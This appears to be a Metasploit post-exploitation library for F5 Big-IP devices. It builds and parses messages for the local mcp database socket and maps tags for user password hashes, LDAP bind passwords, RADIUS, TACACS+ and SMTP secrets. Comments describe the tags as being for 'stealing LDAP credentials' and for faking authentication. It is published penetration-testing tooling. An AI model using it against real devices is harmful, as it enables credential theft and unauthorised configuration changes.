# Encoding: ASCII-8BIT

# TODO: Possibly query these:
# request_audit
# vlan
# interface
# platform
# monitor_param
# monitor
# rule
# rule_event
# profile_auth
# system_information
# master_key
# aaa_*
# sys_device
# smtp_config

# packet_filter_allow_trusted?

module Msf
  class Post
    module Linux
      # The F5 mixin implements methods for querying F5's database, which
      # is found at `/var/run/mcp` on Big-IP and other F5 devices
      module F5
        # This is a (growing!) subset of all possible objects:
        # https://github.com/rbowes-r7/refreshing-mcp-tool/blob/main/mcp-objects.txt
        TAGS_BY_NAME = {
          # Types
          'byte' => 0x0001,
          'bits' => 0x0002,
          'uword' => 0x0003,
          'long' => 0x0004,
          'ulong' => 0x0005,
          'uquad' => 0x0006,
          'ip_address_old' => 0x0007,
          'service' => 0x0008,
          'mac' => 0x0009,
          'date' => 0x000a,
          'time' => 0x000b,
          'tag' => 0x000c,
          'structure' => 0x000d,
          'array' => 0x000e,
          'string' => 0x000f,
          'blob' => 0x0010,
          'ptr' => 0x0011,
          'double' => 0x0012,

          # These are sometimes returned
          'partition_id' => 0x1009,
          'partition_id_query_partitions' => 0x100a,

          # Query types
          'query' => 0x0b64,
          'query_all' => 0x0b65,
          'query_reply' => 0x0b68,
          'create' => 0x0b5a,

          # Result types
          'result' => 0x0b54,
          'result_code' => 0x0b55,
          'result_message' => 0x0b56,
          'result_operation' => 0x0b57,
          'result_type' => 0x0b58,
          'result_attribute' => 0x0b59,

          # User types
          'userdb_entry' => 0x0b11,
          'userdb_entry_name' => 0x0b12,
          'userdb_entry_passwd' => 0x0b13,
          'userdb_entry_is_crypted' => 0x0b14,
          'userdb_entry_gecos' => 0x0b15,
          'userdb_entry_uid' => 0x0b16,
          'userdb_entry_gid' => 0x0b17,
          'userdb_entry_homedir' => 0x0b18,
          'userdb_entry_shell' => 0x0b19,
          'userdb_entry_role' => 0x0b1a,
          'userdb_entry_mark' => 0x0b1b,
          'userdb_entry_dirty_cnt' => 0x0b1c,
          'userdb_entry_object_id' => 0x0b1d,
          'userdb_entry_attributes' => 0x0b1e,
          'userdb_entry_validate_checkpoint' => 0x0b1f,
          'userdb_entry_validate_commit' => 0x0b20,
          'userdb_entry_user_role' => 0x0f8c,
          'userdb_entry_oldpasswd' => 0x1027,
          'userdb_entry_is_system' => 0x115f,
          'userdb_entry_partition_id' => 0x1fc9,
          'userdb_entry_description' => 0x2ad3,
          'userdb_entry_app_id' => 0x2ad4,
          'userdb_entry_strict_app_updates' => 0x2ad5,
          'userdb_entry_transaction_id' => 0x5116,
          'userdb_entry_session_limit' => 0xa081,

          # User roles
          'user_role_partition' => 0x1004,
          'user_role_partition_partition' => 0x1008,
          'user_role_partition_user' => 0x1006,
          'user_role_partition_role' => 0x1007,

          # Used to fake authentication to make changes
          'user_authenticated' => 0x1028,
          'user_authenticated_name' => 0x1029,

          # Database variable types
          'db_variable' => 0x084a,
          'db_variable_name' => 0x084b,
          'db_variable_display_name' => 0x084c,
          'db_variable_value' => 0x084d,
          'db_variable_default' => 0x084e,
          'db_variable_sync_type' => 0x084f,
          'db_variable_data_type' => 0x0850,
          'db_variable_minimum' => 0x0851,
          'db_variable_maximum' => 0x0852,
          'db_variable_enumerated' => 0x0853,
          'db_variable_mark' => 0x0854,
          'db_variable_dirty_cnt' => 0x0855,
          'db_variable_object_id' => 0x0856,
          'db_variable_validate_checkpoint' => 0x0857,
          'db_variable_validate_commit' => 0x0858,
          'db_variable_attributes' => 0x0859,
          'db_restore_info' => 0x108d,
          'db_restore_info_object_id' => 0x108e,
          'db_restore_info_last_object_id' => 0x108f,
          'db_restore_info_dossier' => 0x10b2,
          'db_variable_transaction_id' => 0x118f,
          'db_variable_scf_config' => 0x2874,
          'db_variable_app_id' => 0x2875,
          'db_variable_strict_app_updates' => 0x2876,

          # Transaction stuff
          'start_transaction' => 0x0b6c,
          'start_transaction_reset_level' => 0x0b6d,
          'end_transaction' => 0x0b6e,
          'start_transaction_load_type' => 0x253e,

          # Stealing LDAP credentials
          'auth_ldap_config' => 0x069a,
          'auth_ldap_config_name' => 0x069b,
          'auth_ldap_config_debug' => 0x069c,
          'auth_ldap_config_ignore_authinfo_unavail' => 0x069d,
          'auth_ldap_config_ignore_unknown_user' => 0x069e,
          'auth_ldap_config_warnings' => 0x069f,
          'auth_ldap_config_try_first_pass' => 0x06a0,
          'auth_ldap_config_use_first_pass' => 0x06a1,
          'auth_ldap_config_servers' => 0x06a2,
          'auth_ldap_config_port' => 0x06a3,
          'auth_ldap_config_ssl' => 0x06a4,
          'auth_ldap_config_ssl_check_peer' => 0x06a5,
          'auth_ldap_config_ssl_cacertfile' => 0x06a6,
          'auth_ldap_config_ssl_ciphers' => 0x06a7,
          'auth_ldap_config_ssl_clientkey' => 0x06a8,
          'auth_ldap_config_ssl_clientcert' => 0x06a9,
          'auth_ldap_config_search_base_dn' => 0x06aa,
          'auth_ldap_config_version' => 0x06ab,
          'auth_ldap_config_bind_dn' => 0x06ac,
          'auth_ldap_config_bind_pw' => 0x06ad,
          'auth_ldap_config_scope' => 0x06ae,
          'auth_ldap_config_search_timelimit' => 0x06af,
          'auth_ldap_config_bind_timelimit' => 0x06b0,
          'auth_ldap_config_idle_timelimit' => 0x06b1,
          'auth_ldap_config_filter' => 0x06b2,
          'auth_ldap_config_login_attribute' => 0x06b3,
          'auth_ldap_config_check_host_attr' => 0x06b4,
          'auth_ldap_config_group_dn' => 0x06b5,
          'auth_ldap_config_group_member_attr' => 0x06b6,
          'auth_ldap_config_template_login_attribute' => 0x06b7,
          'auth_ldap_config_template_login' => 0x06b8,
          'auth_ldap_config_password_encoding' => 0x06b9,
          'auth_ldap_config_is_system' => 0x06ba,
          'auth_ldap_config_mark' => 0x06bb,
          'auth_ldap_config_dirty_cnt' => 0x06bc,
          'auth_ldap_config_object_id' => 0x06bd,
          'auth_ldap_config_attributes' => 0x06be,
          'auth_ldap_config_validate_checkpoint' => 0x06bf,
          'auth_ldap_config_validate_commit' => 0x06c0,
          'auth_ldap_config_usertemplate' => 0x0d5d,
          'auth_ldap_config_partition_id' => 0x1057,
          'auth_ldap_config_transaction_id' => 0x111b,
          'auth_ldap_config_description' => 0x280a,
          'auth_ldap_config_leaf_name' => 0x280b,
          'auth_ldap_config_folder_name' => 0x280c,
          'auth_ldap_config_app_id' => 0x280d,
          'auth_ldap_config_strict_app_updates' => 0x280e,
          'auth_ldap_config_check_roles_group' => 0x39ee,
          'auth_ldap_config_referrals' => 0x9d4f,
          'auth_ldap_config_include' => 0x9f80,

          # Radius configuration
          'radius_server' => 0x06c1,
          'radius_server_name' => 0x06c2,
          'radius_server_server' => 0x06c3,
          'radius_server_port' => 0x06c4,
          'radius_server_secret' => 0x06c5,
          'radius_server_timeout' => 0x06c6,
          'radius_server_mark' => 0x06c7,
          'radius_server_dirty_cnt' => 0x06c8,
          'radius_server_object_id' => 0x06c9,
          'radius_server_validate_checkpoint' => 0x06ca,
          'radius_server_validate_commit' => 0x06cb,
          'radius_server_attributes' => 0x06cc,
          'radius_server_partition_id' => 0x1058,
          'radius_server_transaction_id' => 0x111c,
          'radius_server_description' => 0x2a23,
          'radius_server_leaf_name' => 0x2a24,
          'radius_server_folder_name' => 0x2a25,
          'radius_server_app_id' => 0x2a26,
          'radius_server_strict_app_updates' => 0x2a27,

          # TACACS+
          'auth_tacacs_config' => 0x06e7,
          'auth_tacacs_config_name' => 0x06e8,
          'auth_tacacs_config_debug' => 0x06e9,
          'auth_tacacs_config_encrypt' => 0x06ea,
          'auth_tacacs_config_secret' => 0x06eb,
          'auth_tacacs_config_servers' => 0x06ec,
          'auth_tacacs_config_first_hit' => 0x06ed,
          'auth_tacacs_config_acct_all' => 0x06ee,
          'auth_tacacs_config_service_name' => 0x06ef,
          'auth_tacacs_config_protocol_name' => 0x06f0,
          'auth_tacacs_config_is_system' => 0x06f1,
          'auth_tacacs_config_mark' => 0x06f2,
          'auth_tacacs_config_dirty_cnt' => 0x06f3,
          'auth_tacacs_config_object_id' => 0x06f4,
          'auth_tacacs_config_attributes' => 0x06f5,
          'auth_tacacs_config_validate_checkpoint' => 0x06f6,
          'auth_tacacs_config_validate_commit' => 0x06f7,
          'auth_tacacs_config_partition_id' => 0x105b,
          'auth_tacacs_config_transaction_id' => 0x111e,
          'auth_tacacs_config_description' => 0x2823,
          'auth_tacacs_config_leaf_name' => 0x2824,
          'auth_tacacs_config_folder_name' => 0x2825,
          'auth_tacacs_config_app_id' => 0x2826,
          'auth_tacacs_config_strict_app_updates' => 0x2827,
          'auth_tacacs_config_timeout' => 0x7ef6,

          'smtp_config' => 0x3591,
          'smtp_config_object_id' => 0x3592,
          'smtp_config_is_enabled' => 0x3593,
          'smtp_config_is_auth' => 0x3594,
          'smtp_config_source_machine_address' => 0x3595,
          'smtp_config_from_address' => 0x3596,
          'smtp_config_smtp_server_address' => 0x3597,
          'smtp_config_smtp_server_port' => 0x3598,
          'smtp_config_encryption' => 0x3599,
          'smtp_config_username' => 0x359a,
          'smtp_config_password' => 0x359b,
          'smtp_config_app_id' => 0x359c,
          'smtp_config_strict_app_updates' => 0x359d,
          'smtp_config_name' => 0x359e,
          'smtp_config_leaf_name' => 0x359f,
          'smtp_config_folder_name' => 0x35a0,
          'smtp_config_partition_id' => 0x35a1,
          'smtp_config_transaction_id' => 0x5100,
        }

        TAGS_BY_ID = TAGS_BY_NAME.invert()

        def mcp_parse_responses(incoming_data)
          replies = []

          while incoming_data.length > 16
            # Grab the length and remove the header from the incoming data
            expected_length, _, incoming_data = incoming_data.unpack('Na12a*')

            # Read the packet
            packet, incoming_data = incoming_data.unpack("a#{ expected_length }a*")

            # Sanity check
            if packet.length != expected_length
              print_warning("Message truncated!")
              return replies
            end

            # Parse it
            replies << mcp_parse(packet)
          end

          return replies
        end

        def mcp_send_recv(messages)
          # Attach headers to each message and combine them
          message = messages.map do |m|
            [m.length, 0, 0, 0, m].pack('NNNNa*')
          end.join('')

          # Encode as base64 so we can pass it on the commandline
          message = Rex::Text.encode_base64(message)

          # Sometimes, the service doesn't respond with a complete packet, but
          # instead truncates it. This only seems to happen on very long replies,
          # and seems to happen ~50% of the time, so running this loop 5 times
          # gives a pretty high chance of it working
          #
          # This isn't a problem with Metasploit, it even happens when I use
          # socat directly.. I think it's just because we don't have AF_UNIX.
          # In this example, 559604 is right and 548160 is truncated:
          #
          # # echo 'AAAAEAAAAAAAAAAAAAAAAAtlAA0AAAAICEoADQAAAAA=' | base64 -d | socat -t100 - UNIX-CONNECT:/var/run/mcp | wc -c
          # 559604
          # # echo 'AAAAEAAAAAAAAAAAAAAAAAtlAA0AAAAICEoADQAAAAA=' | base64 -d | socat -t100 - UNIX-CONNECT:/var/run/mcp | wc -c
          # 548160
          #
          # This loop is the best we can do without having access to an AF_UNIX
          # socket (or doing something much, much more complex)
          replies = []
          0.upto(4) do
            # Send the request messages(s) to the socket
            incoming_data = cmd_exec("echo '#{message}' | base64 -d | socat -t100 - UNIX-CONNECT:/var/run/mcp")

            # Fail if we got no response or no header
            if !incoming_data || incoming_data.length < 16
              print_error('Request to /var/run/mcp socket failed')
              return nil
            end

            # Get the expected length and make sure the full response is at least
            # that long
            expected_length = incoming_data.unpack('N').pop
            if incoming_data.length < expected_length
              vprint_warning("mcp responded with #{incoming_data.length} bytes instead of the promised #{expected_length} bytes! Trying again...")
            else
              return mcp_parse_responses(incoming_data)
            end
          end

          print_error("mcp wouldn't respond with a full message, giving up")
          nil
        end

        # Recursively parse an mcp message from a binary stream into an object
        #
        # Adapted from https://github.com/rbowes-r7/refreshing-mcp-tool/blob/main/mcp-parser.rb
        def mcp_parse(stream)
          # Note: This has to be an array, not a hash, because there are often
          # duplicate entries (like multiple userdb_entry results when a query
          # is performed)
          result = []

          # Make a Hash of parsers. Some of them are recursive, which is fun!
          #
          # They all take the stream as an input argument, and return
          # [value, stream]
          parsers = {
            # The easy stuff - simple values
            'ulong' => Proc.new { |s| s.unpack('Na*') },
            'long' => Proc.new { |s| s.unpack('Na*') },
            'uquad' => Proc.new { |s| s.unpack('Q>a*') },
            'uword' => Proc.new { |s| s.unpack('na*') },
            'byte' => Proc.new { |s| s.unpack('Ca*') },
            'service' => Proc.new { |s| s.unpack('na*') },

            # Parse "time" as a time
            'time' => Proc.new do |s|
              value, s = s.unpack('Na*')
              [Time.at(value), s]
            end,

            # Look up "tag" values
            'tag' => Proc.new do |s|
              value, s = s.unpack('na*')
              [TAGS_BY_ID[value], s]
            end,

            # Parse MAC addresses
            'mac' => Proc.new do |s|
              value, s = s.unpack('a6a*')
              [value.bytes.map { |b| '%02x' % b }.join(':'), s]
            end,

            # "string" is prefixed by two length values
            'string' => Proc.new do |s|
              length, otherlength, s = s.unpack('Nna*')

              # I'm sure the two length values have a semantic difference, but just check for sanity
              if otherlength + 2 != length
                raise "Inconsistent string lengths: #{ length } + #{ otherlength }"
              end

              s.unpack("a#{ otherlength }a*")
            end,

            # "structure" is recursive
            'structure' => Proc.new do |s|
              length, s = s.unpack('Na*')
              struct, s = s.unpack("a#{ length }a*")

              [mcp_parse(struct), s]
            end,

            # "array" is a bunch of consecutive values of the same type, which
            # means we need to index back into this same parser array
            'array' => Proc.new do |s|
              length, s = s.unpack('Na*')
              array, s = s.unpack("a#{ length }a*")

              type, elements, array = array.unpack('nNa*')
              type = TAGS_BY_ID[type] || "<unknown type 0x%04x>" % type

              array_results = []
              elements.times do
                array_result, array = parsers[type].call(array)
                array_results << array_result
              end

              [array_results, s]
            end
          }

          begin
            while stream.length > 2
              tag, type, stream = stream.unpack('nna*')

              tag  = TAGS_BY_ID[tag]  || "<unknown tag 0x%04x>" % tag
              type = TAGS_BY_ID[type] || "<unknown type 0x%04x>" % type

              if parsers[type]
                value, stream = parsers[type].call(stream)
                result << {
                  tag: tag,
                  value: value
                }
              else
                raise "Tried to parse unknown mcp type (skipping): type = #{ type }, tag = #{ tag }"
              end
            end
          rescue StandardError => e
            # If we fail somewhere, print a warning but return what we have
            print_warning("Parsing mcp data failed: #{e.message}")
          end

          result
        end

        # Pull a single value out of a tag/value structure (ie, the thing
        # returned by mcp_parse()). The result is:
        #
        # * If there are no values with that tag name, return nil
        # * If there's a single value with that tag name, return it
        # * If there are multiple values with that tag name, print an error
        #   and return nil
        def mcp_get_single(h, name)
          # Get all the entries
          entries = mcp_get_multiple(h, name)

          if entries.empty?
            # If there are none, return nil
            return nil
          elsif entries.length == 1
            # If there's one, return it
            return entries.pop
          else
            # If there are multiple entries, print a warning and return nil
            print_warning("Query for mcp type #{name} was supposed to have one response but had #{entries.length}")
            return nil
          end

        end

        # Pull an array of tags with the same name out of a tag/value structure.
        # For example, when you perform a query for `userdb_entry`, it returns
        # multiple tags with the same name.
        #
        # The result is:
        # * If there are no values, return an empty array
        # * If there are one or more values, return them as an array
        def mcp_get_multiple(h, name)
          h.select { |entry| entry[:tag] == name }.map { |entry| entry[:value] }
        end

        # Take an array of results from an mcp query, and change them from
        # an array of tag=>value into a hash.
        #
        # Note! If there are multiple fields with the same tag, this will
        # only return one of them!
        def mcp_to_h(a)
          a.map do |r|
            [r[:tag], r[:value]]
          end.to_h
        end

        # Build an mcp message
        #
        # Adapted from https://github.com/rbowes-r7/refreshing-mcp-tool/blob/main/mcp-builder.rb
        def mcp_build(tag, type, data)
          if TAGS_BY_NAME[tag].nil?
            raise "Invalid mcp tag: #{ tag }"
          end
          if TAGS_BY_NAME[type].nil?
            raise "Invalid mcp type: #{ type }"
          end

          out = ''
          if type == 'structure'
            out = [data.join.length, data.join].pack('Na*')

            # while (out.length % 4) != 0
            #   out += "\0"
            # end
          elsif type == 'string'
            out = [data.length + 2, data.length, data].pack('Nna*')
          elsif type == 'uquad'
            out = [data].pack('Q>')
          elsif type == 'ulong'
            out = [data].pack('N')
          elsif type == 'uword'
            out = [data].pack('n')
          elsif type == 'long'
            out = [data].pack('N')
          elsif type == 'tag'
            out = [TAGS_BY_NAME[data]].pack('n')
          elsif type == 'byte'
            out = [data].pack('C')
          elsif type == 'mac'
            out = [data].pack('a6')
          else
            raise "Unknown type: #{ type }"
          end

          out = [TAGS_BY_NAME[tag], TAGS_BY_NAME[type], out].pack('nna*')

          return out
        end


        # Do a query_all request for something that will reply with a single
        # query result.
        #
        # Attempts to abstract away all the messiness in the protocol, instead
        # we just query for a type and get all the responses as an array of
        # hashes
        def mcp_simple_query(querytype)
          # Get the raw result
          result = mcp_send_recv([
            mcp_build('query_all', 'structure', [
              mcp_build(querytype, 'structure', [])
            ])
          ])

          # Error handling
          unless result
            print_error("mcp_send_recv failed")
            return nil
          end

          # Sanity check - we only expect one result
          if result.length != 1
            print_error("mcp_send_recv query was supposed to return one result, but returned #{result.length} results instead")
            return nil
          end
          # Get that result
          result = result.pop

          # Get the reply
          result = mcp_get_single(result, 'query_reply')
          if result.nil?
            print_error("mcp didn't return a query_reply to our query")
            return nil
          end

          # Get all the fields for the querytype
          result = mcp_get_multiple(result, querytype)

          # Convert each result to a hash
          result = result.map do |single_result|
            mcp_to_h(single_result)
          end

          result
        end
      end
    end
  end
end
